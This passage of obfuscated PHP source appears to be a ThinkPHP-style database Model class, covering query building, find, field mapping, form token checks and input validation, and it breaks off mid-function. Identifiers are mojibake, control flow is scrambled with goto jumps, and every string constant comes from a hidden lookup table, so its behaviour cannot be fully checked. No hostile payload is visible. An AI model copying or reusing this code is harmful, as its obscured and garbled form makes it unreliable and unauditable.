$this->db->buildSelectSql($F¯ÛÜÌµÖÀ) . $BÊ€–âñ™Õ[276]; } $F¯ÛÜÌµÖÀ = $this->_parseOptions(); goto fæÇã∏•ó; E£é¡ﬁõ£Ç: $this->_afterSelect($C‡è®ÒùºÔ, $F¯ÛÜÌµÖÀ); return $C‡è®ÒùºÔ; goto D«úÃ¡’éœ; D«úÃ¡’éœ: } protected function _afterSelect(&$DÇ§÷Ω≤´ã, $F¯˜˘¨ñÖ˘) { } public function buildSql($f∆∂¬Ñ◊áÀ = array()) { $AÛÁı‚Ñªı =& $_SERVER[™⁄»üÆ]; $f∆∂¬Ñ◊áÀ = $this->_parseOptions($f∆∂¬Ñ◊áÀ); return $AÛÁı‚Ñªı[275] . $this->db->buildSelectSql($f∆∂¬Ñ◊áÀ) . $AÛÁı‚Ñªı[276]; } public function optionsValue($D∞–è∂°ã√ = null) { if (is_null($D∞–è∂°ã√)) { return $this->options; } elseif (is_array($D∞–è∂°ã√)) { $this->options = array_merge($this->options, $D∞–è∂°ã√); } } protected function _parseOptions($bõá¢À”¬è = array()) { goto eÀáÜã¡Éª; eÀáÜã¡Éª: $aÊãœ£Ì®‡ =& $_SERVER[™⁄»üÆ]; if (is_array($bõá¢À”¬è)) { $bõá¢À”¬è = array_merge($this->options, $bõá¢À”¬è); } $this->options = array(); goto FÀ˜œ“ƒá; eŸ†µÊÛ¬ì: if (isset($bõá¢À”¬è[$aÊãœ£Ì®‡[273]]) && is_array($bõá¢À”¬è[$aÊãœ£Ì®‡[273]]) && !empty($eÂíåÿÚõ…) && !isset($bõá¢À”¬è[$aÊãœ£Ì®‡[280]]) && !isset($bõá¢À”¬è[$aÊãœ£Ì®‡[277]])) { foreach ($bõá¢À”¬è[$aÊãœ£Ì®‡[273]] as $eê¿Í¢åˆò => $e–ôÇ∏Çà¿) { $eê¿Í¢åˆò = trim($eê¿Í¢åˆò); if (in_array($eê¿Í¢åˆò, $eÂíåÿÚõ…, !0)) { if (is_scalar($e–ôÇ∏Çà¿)) { $this->_parseType($bõá¢À”¬è[$aÊãœ£Ì®‡[273]], $eê¿Í¢åˆò); } } elseif (!is_numeric($eê¿Í¢åˆò) && $aÊãœ£Ì®‡[71] != substr($eê¿Í¢åˆò, 0, 1) && !1 === strpos($eê¿Í¢åˆò, $aÊãœ£Ì®‡[95]) && !1 === strpos($eê¿Í¢åˆò, $aÊãœ£Ì®‡[258]) && !1 === strpos($eê¿Í¢åˆò, $aÊãœ£Ì®‡[281]) && !1 === strpos($eê¿Í¢åˆò, $aÊãœ£Ì®‡[282])) { unset($bõá¢À”¬è[$aÊãœ£Ì®‡[273]][$eê¿Í¢åˆò]); } } } $this->_options_filter($bõá¢À”¬è); return $bõá¢À”¬è; goto cŒ®ÜÇÊÆ°; FÀ˜œ“ƒá: if (!isset($bõá¢À”¬è[$aÊãœ£Ì®‡[277]])) { $bõá¢À”¬è[$aÊãœ£Ì®‡[277]] = $this->getTableName(); $eÂíåÿÚõ… = $this->fields; } else { $eÂíåÿÚõ… = $this->getDbFields(); } if (!empty($bõá¢À”¬è[$aÊãœ£Ì®‡[278]])) { $bõá¢À”¬è[$aÊãœ£Ì®‡[277]] .= $aÊãœ£Ì®‡[50] . $bõá¢À”¬è[$aÊãœ£Ì®‡[278]]; } $bõá¢À”¬è[$aÊãœ£Ì®‡[279]] = $this->name; goto eŸ†µÊÛ¬ì; cŒ®ÜÇÊÆ°: } protected function _options_filter(&$eÑí·πñÒ‡) { } protected function _parseType(&$FÖ§ç©î„¥, $A‚Ú„∫Àﬂ’) { $DÉñ©ä·î… =& $_SERVER[™⁄»üÆ]; if (empty($this->options[$DÉñ©ä·î…[283]][$DÉñ©ä·î…[4] . $A‚Ú„∫Àﬂ’])) { $cå◊ÕÇ¿¥ı = strtolower($this->fields[$DÉñ©ä·î…[250]][$A‚Ú„∫Àﬂ’]); if (!1 !== strpos($cå◊ÕÇ¿¥ı, $DÉñ©ä·î…[284])) { } elseif (!1 === strpos($cå◊ÕÇ¿¥ı, $DÉñ©ä·î…[285]) && !1 !== strpos($cå◊ÕÇ¿¥ı, $DÉñ©ä·î…[286])) { $FÖ§ç©î„¥[$A‚Ú„∫Àﬂ’] = intval($FÖ§ç©î„¥[$A‚Ú„∫Àﬂ’]); } elseif (!1 !== strpos($cå◊ÕÇ¿¥ı, $DÉñ©ä·î…[287]) || !1 !== strpos($cå◊ÕÇ¿¥ı, $DÉñ©ä·î…[288])) { $FÖ§ç©î„¥[$A‚Ú„∫Àﬂ’] = floatval($FÖ§ç©î„¥[$A‚Ú„∫Àﬂ’]); } elseif (!1 !== strpos($cå◊ÕÇ¿¥ı, $DÉñ©ä·î…[289])) { $FÖ§ç©î„¥[$A‚Ú„∫Àﬂ’] = (bool) $FÖ§ç©î„¥[$A‚Ú„∫Àﬂ’]; } } } public function find($A±éñ¨Ò€Ì = array()) { goto C§äÒ˜âÉÚ; cΩÍÁßΩÍ°: if (empty($C…·¨ã£ê…)) { return null; } $this->data = $C…·¨ã£ê…[0]; $this->_afterFind($this->data, $A±éñ¨Ò€Ì); goto c–œ”€ÇØµ; c–œ”€ÇØµ: if (!empty($this->options[$f›¯ëÌ÷£Ô[291]])) { return $this->returnResult($this->data, $this->options[$f›¯ëÌ÷£Ô[291]]); } return $this->data; goto aäôﬁ•çûÑ; C§äÒ˜âÉÚ: $f›¯ëÌ÷£Ô =& $_SERVER[™⁄»üÆ]; if (is_numeric($A±éñ¨Ò€Ì) || is_string($A±éñ¨Ò€Ì)) { $AÜ∏çﬂØØ∏[$this->getPk()] = intval($A±éñ¨Ò€Ì); $this->options[$f›¯ëÌ÷£Ô[273]] = $AÜ∏çﬂØØ∏; } $this->options[$f›¯ëÌ÷£Ô[290]] = 1; goto fı÷™‚Ô¬•; fı÷™‚Ô¬•: $A±éñ¨Ò€Ì = $this->_parseOptions(); $C…·¨ã£ê… = $this->db->select($A±éñ¨Ò€Ì); if (!1 === $C…·¨ã£ê…) { return !1; } goto cΩÍÁßΩÍ°; aäôﬁ•çûÑ: } protected function _afterFind(&$EõÒ“”êŒ‹, $cãı≈…ÿ´ë) { } protected function returnResult($CõŒœ∞Êö≈, $E›∂úêå–£ = '') { $Dâ¶Öõπú‰ =& $_SERVER[™⁄»üÆ]; if ($E›∂úêå–£) { if (is_callable($E›∂úêå–£)) { return call_user_func($E›∂úêå–£, $CõŒœ∞Êö≈); } switch (strtolower($E›∂úêå–£)) { case $Dâ¶Öõπú‰[292]: return json_encode($CõŒœ∞Êö≈); case $Dâ¶Öõπú‰[293]: return xml_encode($CõŒœ∞Êö≈); } } return $CõŒœ∞Êö≈; } public function parseFieldsMap($f≥œ‚¬Ñ∑À, $C›¬Ó™¨ÀÆ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $E˜∂Ù©§ÉÕ => $CÊ™ö»„∂ê) { if ($C›¬Ó™¨ÀÆ == 1) { if (isset($f≥œ‚¬Ñ∑À[$CÊ™ö»„∂ê])) { $f≥œ‚¬Ñ∑À[$E˜∂Ù©§ÉÕ] = $f≥œ‚¬Ñ∑À[$CÊ™ö»„∂ê]; unset($f≥œ‚¬Ñ∑À[$CÊ™ö»„∂ê]); } } else { if (isset($f≥œ‚¬Ñ∑À[$E˜∂Ù©§ÉÕ])) { $f≥œ‚¬Ñ∑À[$CÊ™ö»„∂ê] = $f≥œ‚¬Ñ∑À[$E˜∂Ù©§ÉÕ]; unset($f≥œ‚¬Ñ∑À[$E˜∂Ù©§ÉÕ]); } } } } return $f≥œ‚¬Ñ∑À; } public function setField($DŸ°ÔﬁÉ¬®, $AÂÇ¢ôóí = '') { if (is_array($DŸ°ÔﬁÉ¬®)) { $fìÖ„Â‡ú = $DŸ°ÔﬁÉ¬®; } else { $fìÖ„Â‡ú[$DŸ°ÔﬁÉ¬®] = $AÂÇ¢ôóí; } return $this->save($fìÖ„Â‡ú); } public function setAdd($b°Òÿ«ÈÊÚ, $AÑ—ïôò° = 1) { $cÊ⁄ÌÖÃ¥ =& $_SERVER[™⁄»üÆ]; $EÜÔ˘øØƒè = $b°Òÿ«ÈÊÚ . $cÊ⁄ÌÖÃ¥[294] . $AÑ—ïôò°; if ($AÑ—ïôò° < 0) { $EÜÔ˘øØƒè = $b°Òÿ«ÈÊÚ . $AÑ—ïôò°; } return $this->setField($b°Òÿ«ÈÊÚ, array($cÊ⁄ÌÖÃ¥[295], $EÜÔ˘øØƒè)); } public function getField($fÜËàÜ≠ç‚, $A„›éá∫ô‡ = null) { $BÙ“÷∫Ëóı =& $_SERVER[™⁄»üÆ]; $d‹¿Ò≈ÓëÍ[$BÙ“÷∫Ëóı[271]] = $fÜËàÜ≠ç‚; $d‹¿Ò≈ÓëÍ = $this->_parseOptions($d‹¿Ò≈ÓëÍ); $fÜËàÜ≠ç‚ = trim($fÜËàÜ≠ç‚); if (strpos($fÜËàÜ≠ç‚, $BÙ“÷∫Ëóı[47])) { if (!isset($d‹¿Ò≈ÓëÍ[$BÙ“÷∫Ëóı[290]])) { $d‹¿Ò≈ÓëÍ[$BÙ“÷∫Ëóı[290]] = is_numeric($A„›éá∫ô‡) ? $A„›éá∫ô‡ : $BÙ“÷∫Ëóı[33]; } $e∆ÏÛ‹íà∞ = $this->db->select($d‹¿Ò≈ÓëÍ); if (!empty($e∆ÏÛ‹íà∞)) { goto FºÊÍÙπëà; fª≠Áº‰Ÿ»: $Fñ∆¥ä†ä› = array_shift($fÜËàÜ≠ç‚); $a∞í€Ü–ã¥ = array(); $bæ»«úåü∑ = count($AœÎ®ﬂÃ§°); goto DüòòﬂŸ±Ê; FºÊÍÙπëà: $AœÎ®ﬂÃ§° = explode($BÙ“÷∫Ëóı[47], $fÜËàÜ≠ç‚); $fÜËàÜ≠ç‚ = array_keys($e∆ÏÛ‹íà∞[0]); $c˜∫ä√˜®ì = array_shift($fÜËàÜ≠ç‚); goto fª≠Áº‰Ÿ»; DüòòﬂŸ±Ê: foreach ($e∆ÏÛ‹íà∞ as $a¯’œ‘è∑ú) { $D§ã‡¬”÷É = $a¯’œ‘è∑ú[$c˜∫ä√˜®ì]; if (2 == $bæ»«úåü∑) { $a∞í€Ü–ã¥[$D§ã‡¬”÷É] = $a¯’œ‘è∑ú[$Fñ∆¥ä†ä›]; } else { $a∞í€Ü–ã¥[$D§ã‡¬”÷É] = is_string($A„›éá∫ô‡) ? implode($A„›éá∫ô‡, $a¯’œ‘è∑ú) : $a¯’œ‘è∑ú; } } return $a∞í€Ü–ã¥; goto a™´¢ô¶íù; a™´¢ô¶íù: } } else { if (!0 !== $A„›éá∫ô‡) { $d‹¿Ò≈ÓëÍ[$BÙ“÷∫Ëóı[290]] = is_numeric($A„›éá∫ô‡) ? $A„›éá∫ô‡ : 1; } if ($A„›éá∫ô‡ === $BÙ“÷∫Ëóı[253]) { unset($d‹¿Ò≈ÓëÍ[$BÙ“÷∫Ëóı[290]]); } $a¯’œ‘è∑ú = $this->db->select($d‹¿Ò≈ÓëÍ); if (!empty($a¯’œ‘è∑ú)) { if ($A„›éá∫ô‡ === $BÙ“÷∫Ëóı[253]) { return reset($a¯’œ‘è∑ú[0]); } if (!0 !== $A„›éá∫ô‡ && 1 == $d‹¿Ò≈ÓëÍ[$BÙ“÷∫Ëóı[290]]) { return reset($a¯’œ‘è∑ú[0]); } foreach ($a¯’œ‘è∑ú as $EÑÁÈ‡≥›∫) { $AØØ°†Òù“[] = $EÑÁÈ‡≥›∫[$fÜËàÜ≠ç‚]; } return $AØØ°†Òù“; } } return null; } public function create($B©⁄øÙ“   = '', $e≤ë÷ÎÑñ≈ = '') { goto FùÇ˘î”Òá; c÷ïû”Íµí: return $B©⁄øÙ“  ; goto AÜ•çêï®ı; bÔÜÖÖµ≠‚: if (isset($EìŒÉú°∆‚)) { if (is_string($EìŒÉú°∆‚)) { $EìŒÉú°∆‚ = explode($bπô≠Ñï≥ [47], $EìŒÉú°∆‚); } if (think_config($bπô≠Ñï≥ [296])) { $EìŒÉú°∆‚[] = think_config($bπô≠Ñï≥ [297]); } foreach ($B©⁄øÙ“   as $AêŒ…Í°∏Ü => $Fë∫œÍπç‹) { if (!in_array($AêŒ…Í°∏Ü, $EìŒÉú°∆‚)) { unset($B©⁄øÙ“  [$AêŒ…Í°∏Ü]); } } } if (!$this->autoValidation($B©⁄øÙ“  , $e≤ë÷ÎÑñ≈)) { return !1; } if (!$this->autoCheckToken($B©⁄øÙ“  )) { $this->error = think_lang($bπô≠Ñï≥ [298]); return !1; } goto eØ§∆Òƒ–ì; eØ§∆Òƒ–ì: if ($this->autoCheckFields) { $EìŒÉú°∆‚ = $this->getDbFields(); foreach ($B©⁄øÙ“   as $AêŒ…Í°∏Ü => $Fë∫œÍπç‹) { if (!in_array($AêŒ…Í°∏Ü, $EìŒÉú°∆‚)) { unset($B©⁄øÙ“  [$AêŒ…Í°∏Ü]); } elseif (MAGIC_QUOTES_GPC && is_string($Fë∫œÍπç‹)) { $B©⁄øÙ“  [$AêŒ…Í°∏Ü] = stripslashes($Fë∫œÍπç‹); } } } $this->autoOperation($B©⁄øÙ“  , $e≤ë÷ÎÑñ≈); $this->data = $B©⁄øÙ“  ; goto c÷ïû”Íµí; FùÇ˘î”Òá: $bπô≠Ñï≥  =& $_SERVER[™⁄»üÆ]; if (empty($B©⁄øÙ“  )) { $B©⁄øÙ“   = $_POST; } elseif (is_object($B©⁄øÙ“  )) { $B©⁄øÙ“   = get_object_vars($B©⁄øÙ“  ); } if (empty($B©⁄øÙ“  ) || !is_array($B©⁄øÙ“  )) { $this->error = think_lang($bπô≠Ñï≥ [269]); return !1; } goto F£‘Üÿƒä±; F£‘Üÿƒä±: $B©⁄øÙ“   = $this->parseFieldsMap($B©⁄øÙ“  , 0); $e≤ë÷ÎÑñ≈ = $e≤ë÷ÎÑñ≈ ? $e≤ë÷ÎÑñ≈ : (!empty($B©⁄øÙ“  [$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$bπô≠Ñï≥ [271]])) { $EìŒÉú°∆‚ = $this->options[$bπô≠Ñï≥ [271]]; unset($this->options[$bπô≠Ñï≥ [271]]); } elseif ($e≤ë÷ÎÑñ≈ == THINK_MODEL_INSERT && isset($this->insertFields)) { $EìŒÉú°∆‚ = $this->insertFields; } elseif ($e≤ë÷ÎÑñ≈ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $EìŒÉú°∆‚ = $this->updateFields; } goto bÔÜÖÖµ≠‚; AÜ•çêï®ı: } public function autoCheckToken($dÈªõÀçΩ≤) { $Eàúà◊éÓò =& $_SERVER[™⁄»üÆ]; if (isset($this->options[$Eàúà◊éÓò[299]]) && !$this->options[$Eàúà◊éÓò[299]]) { return !0; } if (think_config($Eàúà◊éÓò[296])) { $c§Ññå∂îƒ = think_config($Eàúà◊éÓò[297]); if (!isset($dÈªõÀçΩ≤[$c§Ññå∂îƒ]) || Session::get($c§Ññå∂îƒ)) { return !1; } list($Eà¬¯±Ë“ê, $Fıâ‹◊úââ) = explode($Eàúà◊éÓò[71], $dÈªõÀçΩ≤[$c§Ññå∂îƒ]); if ($Fıâ‹◊úââ && Session::get($c§Ññå∂îƒ . $Eàúà◊éÓò[95] . $Eà¬¯±Ë“ê) === $Fıâ‹◊úââ) { Session::remove($c§Ññå∂îƒ . $Eàúà◊éÓò[95] . $Eà¬¯±Ë“ê); return !0; } if (think_config($Eàúà◊éÓò[300])) { Session::remove($c§Ññå∂îƒ . $Eàúà◊éÓò[95] . $Eà¬¯±Ë“ê); } return !1; } return !0; } public function regex($bì›óŒ¿¥–, $Bï≤ß¥≤›Ê) { $eË§§áã‘» =& $_SERVER[™⁄»üÆ]; $C¿ÏÍ ‰â· = array($eË§§áã‘»[301] => $eË§§áã‘»[302], $eË§§áã‘»[303] => $eË§§áã‘»[304], $eË§§áã‘»[305] => $eË§§áã‘»[306], $eË§§áã‘»[307] => $eË§§áã‘»[308], $eË§§áã‘»[309] => $eË§§áã‘»[310], $eË§§áã‘»[311] => $eË§§áã‘»[312], $eË§§áã‘»[313] => $eË§§áã‘»[314], $eË§§áã‘»[288] => $eË§§áã‘»[315], $eË§§áã‘»[316] => $eË§§áã‘»[317]); if (isset($C¿ÏÍ ‰â·[strtolower($Bï≤ß¥≤›Ê)])) { $Bï≤ß¥≤›Ê = $C¿ÏÍ ‰â·[strtolower($Bï≤ß¥≤›Ê)]; } return preg_match($Bï≤ß¥≤›Ê, $bì›óŒ¿¥–) === 1; } private function autoOperation(&$Bó÷¥‡ÒùÕ, $f÷–ûÔ√≈∞) { $Cê⁄¿ªÀè¶ =& $_SERVER[™⁄»üÆ]; if (!empty($this->options[$Cê⁄¿ªÀè¶[318]])) { $Fâ…≥»åÕö = $this->options[$Cê⁄¿ªÀè¶[318]]; unset($this->options[$Cê⁄¿ªÀè¶[318]]); } elseif (!empty($this->_auto)) { $Fâ…≥»åÕö = $this->_auto; } if (isset($Fâ…≥»åÕö)) { foreach ($Fâ…≥»åÕö as $eã‰Ü¨ äâ) { if (empty($eã‰Ü¨ äâ[2])) { $eã‰Ü¨ äâ[2] = THINK_MODEL_INSERT; } if ($f÷–ûÔ√≈∞ == $eã‰Ü¨ äâ[2] || $eã‰Ü¨ äâ[2] == THINK_MODEL_BOTH) { switch (trim($eã‰Ü¨ äâ[3])) { case $Cê⁄¿ªÀè¶[319]: case $Cê⁄¿ªÀè¶[320]: $eˆÍ‹ÀíìÉ = isset($eã‰Ü¨ äâ[4]) ? (array) $eã‰Ü¨ äâ[4] : array(); if (isset($Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[0]])) { array_unshift($eˆÍ‹ÀíìÉ, $Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[0]]); } if ($Cê⁄¿ªÀè¶[319] == $eã‰Ü¨ äâ[3]) { $Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[0]] = call_user_func_array($eã‰Ü¨ äâ[1], $eˆÍ‹ÀíìÉ); } else { $Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[0]] = call_user_func_array(array(&$this, $eã‰Ü¨ äâ[1]), $eˆÍ‹ÀíìÉ); } break; case $Cê⁄¿ªÀè¶[271]: $Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[0]] = $Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[1]]; break; case $Cê⁄¿ªÀè¶[321]: if ($Cê⁄¿ªÀè¶[33] === $Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[0]]) { unset($Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[0]]); } break; case $Cê⁄¿ªÀè¶[322]: default: $Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[0]] = $eã‰Ü¨ äâ[1]; } if (!1 === $Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[0]]) { unset($Bó÷¥‡ÒùÕ[$eã‰Ü¨ äâ[0]]); } } } } return $Bó÷¥‡ÒùÕ; } protected function autoValidation($CˆËùáç¯π, $f÷òí´»§÷) { $a†å‰˜·˜õ =& $_SERVER[™⁄»üÆ]; if (!empty($this->options[$a†å‰˜·˜õ[323]])) { $D‰≠¥œüáÓ = $this->options[$a†å‰˜·˜õ[323]]; unset($this->options[$a†å‰˜·˜õ[323]]); } elseif (!empty($this->_validate)) { $D‰≠¥œüáÓ = $this->_validate; } if (isset($D‰≠¥œüáÓ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($D‰≠¥œüáÓ as $eê›Ω™ÿÛΩ => $C∑ΩÜ˜Ï˘§) { if (empty($C∑ΩÜ˜Ï˘§[5]) || $C∑ΩÜ˜Ï˘§[5] == THINK_MODEL_BOTH || $C∑ΩÜ˜Ï˘§[5] == $f÷òí´»§÷) { if (0 == strpos($C∑ΩÜ˜Ï˘§[2], $a†å‰˜·˜õ[324]) && strpos($C∑ΩÜ˜Ï˘§[2], $a†å‰˜·˜õ[325])) { $C∑ΩÜ˜Ï˘§[2] = think_lang(substr($C∑ΩÜ˜Ï˘§[2], 2, -1)); } $C∑ΩÜ˜Ï˘§[3] = isset($C∑ΩÜ˜Ï˘§[3]) ? $C∑ΩÜ˜Ï˘§[3] : THINK_EXISTS_VALIDATE; $C∑ΩÜ˜Ï˘§[4] = isset($C∑ΩÜ˜Ï˘§[4]) ? $C∑ΩÜ˜Ï˘§[4] : $a†å‰˜·˜õ[326]; switch ($C∑ΩÜ˜Ï˘§[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($CˆËùáç¯π, $C∑ΩÜ˜Ï˘§)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($a†å‰˜·˜õ[33] != trim($CˆËùáç¯π[$C∑ΩÜ˜Ï˘§[0]])) { if (!1 === $this->_validationField($CˆËùáç¯π, $C∑ΩÜ˜Ï˘§)) { return !1; } } break; default: if (isset($CˆËùáç¯π[$C∑ΩÜ˜Ï˘§[0]])) { if (!1 === $this->_validationField($CˆËùáç¯π, $C∑ΩÜ˜Ï˘§)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($f—≠ÎŒÔúÉ, $C–€∑ÿúáô) { if (!1 === $this->_validationFieldItem($f—≠ÎŒÔúÉ, $C–€∑ÿúáô)) { if ($this->patchValidate) { $this->error[$C–€∑ÿúáô[0]] = $C–€∑ÿúáô[2]; } else { $this->error = $C–€∑ÿúáô[2]; return !1; } } return; } protected function _validationFieldItem($A¢∏›ë⁄´¿, $AÂôÈÑ¬ù≤) { $Eù‡˜Öï±  =& $_SERVER[™⁄»üÆ]; switch (strtolower(trim($AÂôÈÑ¬ù≤[4]))) { case $Eù‡˜Öï± [319]: case $Eù‡˜Öï± [320]: $b∫åˆÏ∑†í = isset($AÂôÈÑ¬ù≤[6]) ? (array) $AÂôÈÑ¬ù≤[6] : array(); if (is_string($AÂôÈÑ¬ù≤[0]) && strpos($AÂôÈÑ¬ù≤[0], $Eù‡˜Öï± [47])) { $AÂôÈÑ¬ù≤[0] = explode($Eù‡˜Öï± [47], $AÂôÈÑ¬ù≤[0]); } if (is_array($AÂôÈÑ¬ù≤[0])) { foreach ($AÂôÈÑ¬ù≤[0] as $C’Ó¶†Úõ‚) { $bÙ£çòÂ´‹[$C’Ó¶†Úõ‚] = $A¢∏›ë⁄´¿[$C’Ó¶†Úõ‚]; } array_unshift($b∫åˆÏ∑†í, $bÙ£çòÂ´‹); } else { array_unshift($b∫åˆÏ∑†í, $A¢∏›ë⁄´¿[$AÂôÈÑ¬ù≤[0]]); } if ($Eù‡˜Öï± [319] == $AÂôÈÑ¬ù≤[4]) { return call_user_func_array($AÂôÈÑ¬ù≤[1], $b∫åˆÏ∑†í); } else { return call_user_func_array(array(&$this, $AÂôÈÑ¬ù≤[1]), $b∫åˆÏ∑†í); } case $Eù‡˜Öï± [327]: return $A¢∏›ë⁄´¿[$AÂôÈÑ¬ù≤[0]] == $A¢∏›ë⁄´¿[$AÂôÈÑ¬ù≤[1]]; case $Eù‡˜Öï± [328]: if (is_string($AÂôÈÑ¬ù≤[0]) && strpos($AÂôÈÑ¬ù≤[0], $Eù‡˜Öï± [47])) { $AÂôÈÑ¬ù≤[0] = explode($Eù‡˜Öï± [47], $AÂôÈÑ¬ù≤[0]); } $cìÖÕåæ√ÿ = array(); if (is_array($AÂôÈÑ¬ù≤[0])) { foreach ($AÂôÈÑ¬ù≤[0] as $C’Ó¶†Úõ‚) { $cìÖÕåæ√ÿ[$C’Ó¶†Úõ‚] = $A¢∏›ë⁄´¿[$C’Ó¶†Úõ‚]; } } else { $cìÖÕåæ√ÿ[$AÂôÈÑ¬ù≤[0]] = $A¢∏›ë⁄´¿[$AÂôÈÑ¬ù≤[0]]; } if (!empty($A¢∏›ë⁄´¿[$this->getPk()])) { $cìÖÕåæ√ÿ[$this->getPk()] = array($Eù‡˜Öï± [329], $A¢∏›ë⁄´¿[$this->getPk()]); } if ($this->where($cìÖÕåæ√ÿ)->find()) { return !1; } return !0; default: return $this->check($A¢∏›ë⁄´¿[$AÂôÈÑ¬ù≤[0]], $AÂôÈÑ¬ù≤[1], $AÂôÈÑ¬ù≤[4]); } } public function check($C∆öÈªõ®–, $bö«õ·€Ãå, $Eú™Ç¯∂ê… = "\x72\x65\x67\145\x78") { $c¡∆“À§°ˆ =& $_SERVER[™⁄»üÆ]; $Eú™Ç¯∂ê… = strtolower(trim($Eú™Ç¯∂ê…)); switch ($Eú™Ç¯∂ê…) { case $c¡∆“À§°ˆ[7]: case $c¡∆“À§°ˆ[330]: $D‰ëÂ∞Ã≠∆ = is_array($bö«õ·€Ãå) ? $bö«õ·€Ãå : explode($c¡∆“À§°ˆ[47], $bö«õ·€Ãå); return $Eú™Ç¯∂ê… == $c¡∆“À§°ˆ[7] ? in_array($C∆öÈªõ®–, $D‰ëÂ∞Ã≠∆) : !in_array($C∆öÈªõ®–, $D‰ëÂ∞Ã≠∆); case $c¡∆“À§°ˆ[331]: case $c¡∆“À§°ˆ[332]: if (is_array($bö«õ·€Ãå)) { $c¨Ω©ÉË·¶ = $bö«õ·€Ãå[0]; $BôΩˆΩÔ˘“ = $bö«õ·€Ãå[1]; } else { list($c¨Ω©ÉË·¶, $BôΩˆΩÔ˘“) = explode($c¡∆“À§°ˆ[47], $bö«õ·€Ãå); } return $Eú™Ç¯∂ê… == $c¡∆“À§°ˆ[331] ? $C∆öÈªõ®– >= $c¨Ω©ÉË·¶ && $C∆öÈªõ®– <= $BôΩˆΩÔ˘“ : $C∆öÈªõ®– < $c¨Ω©ÉË·¶ || $C∆öÈªõ®– > $BôΩˆΩÔ˘“; case $c¡∆“À§°ˆ[333]: case $c¡∆“À§°ˆ[334]: return $Eú™Ç¯∂ê… == $c¡∆“À§°ˆ[333] ? $C∆öÈªõ®– == $bö«õ·€Ãå : $C∆öÈªõ®– != $bö«õ·€Ãå; case $c¡∆“À§°ˆ[335]: $F ÷éí≠ãü = mb_strlen($C∆öÈªõ®–, $c¡∆“À§°ˆ[336]); if (strpos($bö«õ·€Ãå, $c¡∆“À§°ˆ[47])) { list($c¨Ω©ÉË·¶, $BôΩˆΩÔ˘“) = explode($c¡∆“À§°ˆ[47], $bö«õ·€Ãå); return $F ÷éí≠ãü >= $c¨Ω©ÉË·¶ && $F ÷éí≠ãü <= $BôΩˆΩÔ˘“; } else { return $F ÷éí≠ãü == $bö«õ·€Ãå; } case $c¡∆“À§°ˆ[337]: list($cÃµÖﬁÀ„Ô, $aæãÁæïÛñ) = explode($c¡∆“À§°ˆ[47], $bö«õ·€Ãå); if (!is_numeric($cÃµÖﬁÀ„Ô)) { $cÃµÖﬁÀ„Ô = strtotime($cÃµÖﬁÀ„Ô); } if (!is_numeric($aæãÁæïÛñ)) { $aæãÁæïÛñ = strtotime($aæãÁæïÛñ); } return NOW_TIME >= $cÃµÖﬁÀ„Ô && NOW_TIME <= $aæãÁæïÛñ; case $c¡∆“À§°ˆ[338]: return in_array(get_client_ip(), explode($c¡∆“À§°ˆ[47], $bö«õ·€Ãå)); case $c¡∆“À§°ˆ[339]: return !in_array(get_client_ip(), explode($c¡∆“À§°ˆ[47], $bö«õ·€Ãå)); case $c¡∆“À§°ˆ[326]: default: return $this->regex($C∆öÈªõ®–, $bö«õ·€Ãå); } } public function query($eø—ÜÂππ∞, $b®ﬁÏó À◊ = false) { $fíÈÌ†âµ¶ =& $_SERVER[™⁄»üÆ]; if (!is_bool($b®ﬁÏó À◊) && !is_array($b®ﬁÏó À◊)) { $b®ﬁÏó À◊ = func_get_args(); array_shift($b®ﬁÏó À◊); } $eø—ÜÂππ∞ = str_replace(array($fíÈÌ†âµ¶[229], $fíÈÌ†âµ¶[340]), $fíÈÌ†âµ¶[50], $eø—ÜÂππ∞); $eø—ÜÂππ∞ = $this->parseSql($eø—ÜÂππ∞, $b®ﬁÏó À◊); return $this->db->query($eø—ÜÂππ∞); } public function execute($eﬂ∑è≤÷‹ˆ, $Bˆ¥íÉÍ¿ü = false) { if (!is_bool($Bˆ¥íÉÍ¿ü) && !is_array($Bˆ¥íÉÍ¿ü)) { $Bˆ¥íÉÍ¿ü = func_get_args(); array_shift($Bˆ¥íÉÍ¿ü); } $eﬂ∑è≤÷‹ˆ = $this->parseSql($eﬂ∑è≤÷‹ˆ, $Bˆ¥íÉÍ¿ü); return $this->db->execute($eﬂ∑è≤÷‹ˆ); } protected function parseSql($fãÜ·ÈÕ√å, $f‘ùé˜¿à) { $cÿ≈å∑Ââ» =& $_SERVER[™⁄»üÆ]; if (!0 === $f‘ùé˜¿à) { $fÎπæëãæ = $this->_parseOptions(); $fãÜ·ÈÕ√å = $this->db->parseSql($fãÜ·ÈÕ√å, $fÎπæëãæ); } elseif (is_array($f‘ùé˜¿à)) { $f‘ùé˜¿à = array_map(array($this->db, $cÿ≈å∑Ââ»[341]), $f‘ùé˜¿à); $fãÜ·ÈÕ√å = vsprintf($fãÜ·ÈÕ√å, $f‘ùé˜¿à); } else { $fãÜ·ÈÕ√å = strtr($fãÜ·ÈÕ√å, array($cÿ≈å∑Ââ»[342] => $this->getTableName(), $cÿ≈å∑Ââ»[343] => think_config($cÿ≈å∑Ââ»[242]))); } $this->db->setModel($this->name); return $fãÜ·ÈÕ√å; } public function db($E¬¿äÙ—õ§ = '', $a≈Ωí›´ÿê = '', $CÉÈ Í∆ûì = array()) { goto cÉäÜÇâ©É; Fô™≠§ö‹Ì: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto DŸÊàÁ⁄ì“; Fä≤ë¡˘Áâ: $a…Ü‡◊èùÑ[$E¬¿äÙ—õ§] = $a≈Ωí›´ÿê; $this->db = $b≤Œã‰∆à˜[$E¬¿äÙ—õ§]; $this->_after_db(); goto 